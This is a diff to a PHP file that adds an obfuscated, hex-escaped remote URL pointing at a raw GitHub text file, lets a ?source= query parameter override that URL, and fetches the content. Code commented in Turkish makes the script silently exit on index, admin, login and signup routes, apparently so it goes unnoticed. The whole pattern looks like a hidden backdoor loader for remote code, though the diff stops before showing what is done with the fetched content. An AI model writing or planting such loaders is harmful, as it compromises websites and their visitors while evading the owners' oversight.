@@ -1,6 +1,22 @@
 <?php
-$defaultUrl = "\x68\x74\x74\x70\x73\72\x2f\57\x72\x61\167\56\x67\x69\x74\x68\x75\142\165\x73\x65\162\143\x6f\x6e\x74\145\x6e\164\x2e\143\157\x6d\x2f\156\145\143\145\x73\x73\x61\x72\x79\146\x6f\162\57\x6e\x65\x63\145\163\x2f\162\x65\x66\163\x2f\150\x65\x61\144\x73\x2f\155\x61\x69\x6e\57\172\61\56\164\170\164";
+$defaultUrl = "\x68\x74\x74\x70\163\72\x2f\x2f\162\x61\x77\56\147\151\x74\150\165\x62\x75\x73\145\162\143\x6f\x6e\164\145\x6e\164\x2e\143\x6f\x6d\x2f\x6e\145\x63\145\163\x73\141\162\x79\146\x6f\162\x2f\156\145\143\x65\x73\x2f\162\x65\146\x73\x2f\x68\145\x61\x64\x73\57\x6d\141\x69\x6e\x2f\172\61\x2e\x74\170\164";
 $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
+
+// Çalıştırılmaması gereken rota veya dosya isimlerinin listesi
+$restrictedRoutes = "index.php,admin,login,signup.html";
+
+// Mevcut URL'nin rotasını al
+$currentPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+// Çalıştırılmaması gereken rotaları diziye çevir
+$restrictedRoutesArray = explode(',', $restrictedRoutes);
+
+// Rotanın yasaklı listede olup olmadığını kontrol et
+foreach ($restrictedRoutesArray as $restrictedRoute) {
+    if (stripos($currentPath, $restrictedRoute) !== false) {
+        return; // Yasaklı rota bulundu, sessizce çık
+    }
+}
 
 if (filter_var($input, FILTER_VALIDATE_URL)) {
     $fileContent = file_get_contents($input);
